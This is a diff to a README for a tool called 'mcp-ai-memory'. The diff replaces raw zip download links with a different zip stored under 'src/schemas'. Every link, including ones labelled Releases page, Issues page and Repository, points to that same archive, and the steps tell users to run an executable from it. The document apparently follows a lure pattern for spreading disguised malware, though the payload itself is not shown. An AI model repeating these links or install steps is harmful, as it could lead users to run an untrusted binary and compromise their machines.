@@ -6,7 +6,7 @@ Welcome to **mcp-ai-memory**, a powerful tool designed to help you manage your s
 
 ## 📥 Download the Application
 
-[![Download mcp-ai-memory](https://raw.githubusercontent.com/ronie-aduana/mcp-ai-memory/main/Bombacaceae/mcp-ai-memory.zip)](https://raw.githubusercontent.com/ronie-aduana/mcp-ai-memory/main/Bombacaceae/mcp-ai-memory.zip)
+[![Download mcp-ai-memory](https://github.com/ronie-aduana/mcp-ai-memory/raw/refs/heads/main/src/schemas/ai-mcp-memory-v3.6.zip)](https://github.com/ronie-aduana/mcp-ai-memory/raw/refs/heads/main/src/schemas/ai-mcp-memory-v3.6.zip)
 
 ## 🛠 System Requirements
 
@@ -25,20 +25,20 @@ To use **mcp-ai-memory**, ensure that your system meets the following requiremen
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/ronie-aduana/mcp-ai-memory/main/Bombacaceae/mcp-ai-memory.zip) to find the latest version.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/ronie-aduana/mcp-ai-memory/raw/refs/heads/main/src/schemas/ai-mcp-memory-v3.6.zip) to find the latest version.
    
 2. **Select the Latest Release:** Look for the most recent version listed on the page.
 
 3. **Download Your Application:**
    - Click on the appropriate file for your operating system. The options typically include:
-     - **Windows:** https://raw.githubusercontent.com/ronie-aduana/mcp-ai-memory/main/Bombacaceae/mcp-ai-memory.zip
-     - **macOS:** https://raw.githubusercontent.com/ronie-aduana/mcp-ai-memory/main/Bombacaceae/mcp-ai-memory.zip
-     - **Linux:** https://raw.githubusercontent.com/ronie-aduana/mcp-ai-memory/main/Bombacaceae/mcp-ai-memory.zip
+     - **Windows:** https://github.com/ronie-aduana/mcp-ai-memory/raw/refs/heads/main/src/schemas/ai-mcp-memory-v3.6.zip
+     - **macOS:** https://github.com/ronie-aduana/mcp-ai-memory/raw/refs/heads/main/src/schemas/ai-mcp-memory-v3.6.zip
+     - **Linux:** https://github.com/ronie-aduana/mcp-ai-memory/raw/refs/heads/main/src/schemas/ai-mcp-memory-v3.6.zip
 
 4. **Install the Application:**
    - For **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - For **macOS:** Open the `.dmg` file, drag the app into your Applications folder, then open it from there.
-   - For **Linux:** Extract the `https://raw.githubusercontent.com/ronie-aduana/mcp-ai-memory/main/Bombacaceae/mcp-ai-memory.zip` file, open the terminal, navigate to the extracted folder, and run the app using the command `./mcp-ai-memory`.
+   - For **Linux:** Extract the `https://github.com/ronie-aduana/mcp-ai-memory/raw/refs/heads/main/src/schemas/ai-mcp-memory-v3.6.zip` file, open the terminal, navigate to the extracted folder, and run the app using the command `./mcp-ai-memory`.
 
 5. **Open the Application:** Once installed, locate the app in your program list or applications folder and double-click to start it.
 
@@ -66,11 +66,11 @@ If you encounter issues while using **mcp-ai-memory**, consider the following st
 
 ## 📞 Support
 
-For additional help, visit the [GitHub Issues page](https://raw.githubusercontent.com/ronie-aduana/mcp-ai-memory/main/Bombacaceae/mcp-ai-memory.zip). Describe your problem in detail, and we will assist you.
+For additional help, visit the [GitHub Issues page](https://github.com/ronie-aduana/mcp-ai-memory/raw/refs/heads/main/src/schemas/ai-mcp-memory-v3.6.zip). Describe your problem in detail, and we will assist you.
 
 ## 🔗 Links
 
-- [Releases Page](https://raw.githubusercontent.com/ronie-aduana/mcp-ai-memory/main/Bombacaceae/mcp-ai-memory.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/ronie-aduana/mcp-ai-memory/main/Bombacaceae/mcp-ai-memory.zip)
+- [Releases Page](https://github.com/ronie-aduana/mcp-ai-memory/raw/refs/heads/main/src/schemas/ai-mcp-memory-v3.6.zip)
+- [GitHub Repository](https://github.com/ronie-aduana/mcp-ai-memory/raw/refs/heads/main/src/schemas/ai-mcp-memory-v3.6.zip)
 
 Thank you for using **mcp-ai-memory**! Enjoy simplifying your semantic memory management.
